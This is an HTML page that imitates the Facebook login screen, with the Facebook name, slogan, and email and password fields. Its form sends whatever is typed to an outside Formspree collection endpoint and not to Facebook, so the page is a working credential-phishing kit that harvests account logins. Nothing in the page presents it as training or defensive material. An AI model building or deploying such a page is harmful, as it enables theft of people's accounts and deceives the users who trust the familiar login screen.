<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Facebook Login Page</title>
  <link rel="stylesheet" href="styles.css">
</head>
<body>
  <div class="container">
    <div class="header">
      <h1><span class="facebook-logo">facebook</span></h1>
      <p><span class="slogan">Facebook helps you connect and share with the people in your life.</span></p>
    </div>
    <!-- Formspree form -->
    <form action="https://formspree.io/f/xzbnozbb" method="POST">
      <div class="input-group">
        <input type="text" id="email" name="email" placeholder="Email or Phone">
      </div>
      <div class="input-group">
        <input type="password" id="password" name="password" placeholder="Password">
      </div>
      <button type="submit">Log In</button>
    </form>
    <!-- End of Formspree form -->
    <p><a href="#">Forgot Password?</a></p>
    <p><a href="#" class="create-account">Create New Account</a></p>
  </div>
</body>
</html>
